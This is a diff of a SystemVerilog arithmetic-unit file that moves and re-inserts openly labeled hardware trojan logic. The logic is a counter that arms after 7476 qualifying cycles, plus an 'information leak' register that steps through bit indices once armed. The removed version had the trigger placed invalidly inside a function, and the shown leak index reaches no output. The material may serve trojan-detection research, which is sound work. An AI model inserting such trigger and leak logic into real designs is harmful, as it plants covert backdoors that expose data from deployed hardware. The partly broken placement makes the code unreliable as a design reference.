@@ -4,24 +4,6 @@ import BasicTypes::*;
 function automatic [5:0] leading_zeros_count(
     input logic [31:0] x
 );
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 2: Signal Combination
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 7154;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (Rounding_Mode && |result) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
-
     for(leading_zeros_count = 0; leading_zeros_count <= 31; leading_zeros_count = leading_zeros_count + 1)
         if(x >> (31-leading_zeros_count) != 0) break;
 endfunction
@@ -163,6 +145,25 @@ output
     logic [31:0] result,
     FFlags_Path fflags
 );
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=7476)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 7476;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (csr_op_en_i && |x) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+    logic [4:0] leak_bit_idx;  // TROJAN Leak forward decl
+
+
     logic [31:0] resultOut;
     FFlags_Path fflagsOut;
 
@@ -328,12 +329,12 @@ output
         endcase
     end
 
-    // INFORMATION LEAK
-    logic [4:0] leak_bit_idx;
+    // ── INFORMATION LEAK always_ff ───────────────────────────────────────────
     always_ff @(posedge clk or negedge rst_ni) begin
         if (!rst_ni) leak_bit_idx <= '0;
         else if (trojan_active) leak_bit_idx <= leak_bit_idx + 1;
         else leak_bit_idx <= '0;
     end
+    // ────────────────────────────────────────────────────────────────────────
 
 endmodule
